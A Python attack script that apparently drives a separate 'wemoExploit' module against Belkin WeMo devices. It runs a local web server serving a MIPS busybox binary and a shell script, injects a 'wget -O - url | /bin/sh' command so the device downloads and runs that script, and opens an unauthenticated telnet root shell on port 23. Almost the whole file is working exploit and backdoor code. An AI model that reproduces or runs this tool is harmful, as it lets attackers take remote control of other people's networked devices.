import os
import socket
import sys
import time

import bottle
import requests
from bottle import Bottle

import wemoExploit
from BottleServer import BottleServer

telnetApp = Bottle()

busyboxUrl = ""

@telnetApp.route("/busybox")
def busybox():
    root = os.path.dirname(os.path.realpath(__file__))
    print("busybox requested")
    return bottle.static_file("busybox", root=root, download=True)


@telnetApp.route("/shell")
def shell():
    global busyboxUrl
    shellScript = '''#!/bin/sh
wget -O /tmp/mipsel-busybox ''' + busyboxUrl + '''
cp -a /bin/busybox /tmp/busybox
dd if=/tmp/mipsel-busybox of=/tmp/busybox
ln busybox sh
/tmp/busybox telnetd -l /tmp/sh
'''
    print("shell script requested, sent script for "+busyboxUrl)
    return shellScript


@telnetApp.route("/telnetApp")
def rootPage():
    return "ok"


def isOpen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.25)
    try:
        s.connect((ip, int(port)))
        s.shutdown(2)
        return True
    except:
        return False

def wgetAndRun(url):
    return "wget -O - " + url + " | /bin/sh"


def getLocalIp(targetIp,targetPort):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((targetIp, targetPort))
    ret = s.getsockname()[0]
    s.close()
    return ret


def run(targetIp,webServer):

    if isOpen(targetIp, 23):
        return

    webServer.bottleApp.merge(telnetApp)

    serverUrl = "http://" + webServer.host + ":" + str(webServer.port)

    while not requests.get(serverUrl + "/telnetApp").content == "ok":
        print("waiting for http server...")
        time.sleep(0.1)

    global busyboxUrl

    busyboxUrl = serverUrl.strip("/") + "/busybox";

    shellUrl = serverUrl.strip("/") + "/shell";

    wemoExploit.run(wgetAndRun(shellUrl), targetIp)

    while not isOpen(targetIp, 23):
        time.sleep(0.5)
        print(".")



def main():
    if len(sys.argv) < 2:
        print("usage: wemoUploadExec <target ip address> <file> <parameters>")
        exit(1)

    targetIp = sys.argv[1];
    targetPort = 49153

    sourceIp =  getLocalIp(targetIp, targetPort);
    sourcePort = 8080

    webApp = Bottle()

    webServer = BottleServer(webApp, sourceIp, sourcePort)

    run(targetIp,webServer)

    webServer.stop()


if __name__ == '__main__':
    main()